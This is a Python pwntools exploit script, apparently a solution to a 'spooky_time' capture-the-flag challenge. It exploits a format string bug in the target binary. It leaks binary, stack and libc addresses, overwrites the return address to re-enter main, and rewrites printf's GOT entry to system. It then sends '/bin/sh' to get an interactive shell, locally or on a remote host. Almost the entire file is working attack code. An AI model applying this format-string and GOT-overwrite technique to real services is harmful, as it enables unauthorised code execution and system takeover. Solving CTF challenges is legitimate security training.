#!/usr/bin/env python3

from pwn import *

e = ELF("./spooky_time_patched")
libc = ELF('./glibc/libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        # r = gdb.debug([e.path], '''
        #               b *(main)
        #               b *(main+0x73)
        #               b *(main+0xd2)
        #               b *(main+0xfc)
        #               c
        #               ''', stdin=process.PTY, stdout=process.PTY)
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      b *(main+0x73)
                      b *(main+0xd2)
                      b *(main+0xfc)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # FSB to leak addresses and use %n to overwrite content.
    # !!! Note that we should use gdb.attach() instead of the gdb.debug() otherwise the offsets below will be wrong when in non-debug mode.
    # This is likely due to gdb.debug() will disable ASLR.

    # Iteration 1
    # leak binary and stack address
    # The 36 and 39 are found by debugging and checking stack values.
    r.sendlineafter(b'say something scary!', b'%36$p%39$p')
    r.recvuntil(b'Seriously?? I bet you can do better than ')
    r.recvline()
    data = r.recvline().strip()
    _, binary_addr, stack_addr = data.split(b'0x')
    main_addr = int(binary_addr, 16) + 0x1380   # the 0x1380 is found by substracting the output address to the main address during GDB
    ret_addr = int(stack_addr, 16) - 0x4b1
    info(f'calculated main address {hex(main_addr)}, ret address is on stack address {hex(ret_addr)}')
    main_offset = e.sym.main - e.address
    e.address = main_addr - main_offset

    payload = fmtstr_payload(offset=8, writes={
        ret_addr: ROP(e).ret[0],  # This is for stack alignment purpose
        ret_addr + 8: main_addr,
        })
    # payload = 'AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' # Use this to locate the offset (8).
    r.sendlineafter(b'one more time..', payload)

    # Iteration 2
    # leak libc base address
    r.sendlineafter(b'say something scary!', b'%67$p')
    r.recvuntil(b'Seriously?? I bet you can do better than ')
    r.recvline()
    data = r.recvline().strip()
    output_addr = int(data, 16)
    libc.address = output_addr - 0x29e40
    info(f'the leaked libc base address is {hex(libc.address)}')
    info(f'then the printf is at {hex(libc.sym.printf)}')
    info(f'then the system is at {hex(libc.sym.system)}')
    info(f'the printf@got is at {hex(e.got.printf)}')

    # overwrite print@got to system() 
    payload = fmtstr_payload(offset=8, writes={
        e.got.printf: libc.sym.system,
        ret_addr + 0x10: ROP(e).ret[0],  # This is for stack alignment purpose
        ret_addr + 0x18: main_addr,
        }, write_size='short')
    # pause()
    r.sendlineafter(b'one more time..', payload)

    # Iteration 3
    # Trigger system('/bin/sh')
    # pause()
    r.sendlineafter(b'say something scary!', b'/bin/sh')

    r.interactive()

if __name__ == "__main__":
    main()
